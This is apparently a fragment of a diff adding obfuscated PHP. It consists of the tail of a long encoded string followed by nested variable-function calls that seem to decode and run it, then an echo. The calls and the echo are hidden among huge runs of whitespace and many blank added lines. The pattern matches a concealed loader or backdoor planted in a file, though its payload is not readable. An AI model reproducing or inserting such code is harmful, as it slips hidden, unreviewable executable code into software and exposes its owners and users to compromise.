vl7JexsmdGZ3rwIc3gLYuJDvY0Hv7ffPzjgsZf3CDb3E3ozPKNQ1FSvXhMb2qpbrclesSaw93VpnGvXBHbyGhf1tqvXJEZgp2Cro+gja4JcZOvlZ9r2decr1rSxW9jvQcf4wJraG29R0HL1mqw+xFf0rKEUXSMn42hfgdpd6nITju7LVM/vnNybKb9X7ImQMAT/hDUtetYX8dftw/tNdY963516It+r+hQab4+icTCeZ76DxiyGfyZOzXD0EWJ4G3wRxuc2jW26Ecgi8XQmOneOIffptFYB8jrgEMse+M4yjT6gwdfmsRf1g1+BbwtLl9MP0lQag/q5XKe85hihwSfV+ZTjmy9NIffj5BDPUJ/zkfuYbZLHkXt8xBxgbyfGBTF72ZfncoX8T8QzWknuq+fgL1k8d3MmXyj5E4w5svc/SV4rSw8+wBfyWXoDONuOr+cJxAi4T/sp8oGx+tfzJPM7n6O3pu6x2GMKuHCtLc0syF8xDv8kOUEuzDM5Xv+/4JHDrRgHaIDc9VoeHfzh5/Bo7bQsPHP8EZpKY3wOn0p+9mq5lX31Rbbmv233e/9DzwXRmOMdelT4P8oj7pP8Fua+GG+8A39KcTjVIfMD+MPOcL/8Gn5U/NT8A7hj8KmdnyXDtbwHb7Ic4MPyoH7pivnxvQ+vP8Ona/Sg5Ic+Nn/y75y/5HeuoOGQ63yUjnK+cxU+HPzMR3Sx8A9X2WThnz5MR9mvXCGXUr72YYzC75O4Xi5HfuQiHTnaZ6F6ktWo+Z11J2tZz19WV97X+8o5JH6XD35PU5HXNpwNOnmm9sS5IHvB4rqyHrbz/qnw4VIvOebJgszdiOD3GtV8Kz3bUpNl5iNq8UpTze1PR3/V93tQ53M/88RcTb7tLZrgmekV55bn7+dx7qsu4Vl4iRyaYtOHEzSReXZW6CxN8+Z5DrnTKX5WsfyKc+q7E32AqBOgA0mTTpzKF96rW7VxrtOHce/9+lDD27OydhYdrjmebZLHAfM+yJtavnFK/k14fQldx7yu1rmoP6G0jAbjYBRm9SrEg/xsAM7T2a+hqvsnMDdMDtiK3+uilmQEOT3u32KfoRNldBqcRev3eJ4qt6NNWS+H8+7rCGuQd1JM+xHvjvaTxWkw8Sdam1dTfjIhRPjUej78NPBsv99zxDtc8/7c4Cn+NvExOyeDunly36tzao/9xHjbyvfYNI1XHuM5buyxpn4e7IH2eJyhj/Zft7Jzcdlea3ujcuHs1HgNe/uoa5UztQ3P/Nosi3P7Ql7e53HmmbtmGg9noE+tGe2ZPnOCrnJPRwPvsv6TwzMn6Kj3ZBQ6VqKj/swJnaC/Sdaz0bSuTlkfS70rFBMzego9P7HmAreb+ZbhdB3jm8diO4fvdeq9MVZU2FYZ7yAHhtxl8TUfc/+9MIf48fBdWtWzO83nGNtsFnMfzic2fvdH0efcXdq4v6/SfvnUwF7y/it+pxnEohrtp8P9gj1ejlI/2OPi4SzmNh4W/TxAd8QMv/z2ww//+i9v/Z3+/in/6++/vef10ruXvPi3w4Q/fcH///K/xbS3/3btf+Z/u7Yq258qypSJ9u+//R9SpIin';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
